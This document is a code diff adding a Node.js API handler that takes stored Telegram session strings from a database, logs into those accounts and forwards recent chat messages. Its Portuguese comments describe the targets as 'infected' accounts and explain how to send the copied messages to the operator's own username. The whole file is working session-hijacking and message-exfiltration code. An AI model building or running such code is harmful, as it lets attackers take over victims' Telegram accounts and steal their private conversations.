@@ -1,0 +1,32 @@
+import { TelegramClient } from "telegram";
+import { StringSession } from "telegram/sessions";
+import { createClient } from '@supabase/supabase-js';
+
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
+const apiId = parseInt(process.env.TELEGRAM_API_ID);
+const apiHash = process.env.TELEGRAM_API_HASH;
+
+export default async function handler(req, res) {
+  const { phone, fromChatId, limit } = req.body;
+
+  const { data } = await supabase.from('telegram_sessions').select('session_string').eq('phone_number', phone).single();
+  const client = new TelegramClient(new StringSession(data.session_string), apiId, apiHash, { connectionRetries: 1, useWSS: false });
+
+  try {
+    await client.connect();
+
+    // Pega as últimas X mensagens
+    const messages = await client.getMessages(fromChatId, { limit: parseInt(limit) || 10 });
+    
+    // Encaminha para o próprio "Saved Messages" (me) da conta infectada
+    // Se quiser mandar para VOCÊ, troque 'me' pelo seu @username
+    await client.forwardMessages('me', { messages: messages, fromPeer: fromChatId });
+
+    await client.disconnect();
+    res.status(200).json({ success: true, msg: `Últimas ${messages.length} mensagens clonadas para o Saved Messages da conta.` });
+
+  } catch (error) {
+    await client.disconnect();
+    res.status(500).json({ error: error.message });
+  }
+}
